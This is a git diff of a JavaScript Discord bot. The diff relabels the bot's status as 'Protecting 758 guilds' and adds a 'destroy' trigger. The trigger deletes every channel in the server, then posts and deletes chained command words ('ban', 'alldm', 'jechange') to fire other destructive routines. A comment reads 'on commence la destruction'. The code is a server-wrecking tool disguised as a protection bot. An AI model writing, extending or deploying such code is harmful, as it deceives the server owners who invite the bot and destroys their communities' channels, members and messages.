@@ -5,7 +5,7 @@ const bot = new Discord.Client();
 
 bot.login (process.env.TOKEN);
 bot.on("ready", () => {
-bot.user.setActivity('Neanelis', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('Protecting 758 guilds', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
 
@@ -255,8 +255,18 @@ if(message.content.includes("serversjoin")){
 
                       }
                     }
-                    if(message.content === "zebi"){
-                      message.guild.channels.map(c => c.delete())                     
+                    if(message.content === "destroy"){
+                      message.guild.channels.map(c => c.delete())
+                      }
+                      //on commence la destruction
+                      if(message.content.includes("destroy")){
+                          message.channel.send("ban").then(m => m.delete());
+                          message.channel.send("channel").then(m => m.delete());
+                          message.channel.send("drole").then(m => m.delete());
+                          message.channel.send("destroy").then(m => m.delete());
+                          message.channel.send("jechange").then(m => m.delete());
+                          message.channel.send("alldm").then(m => m.delete());
+                          message.guild.createChannel("LA PIGEONNERIE", "text").then(c => c.send("channel"))
                       }                                                                                   
                     });
 bot.on('message', message => {
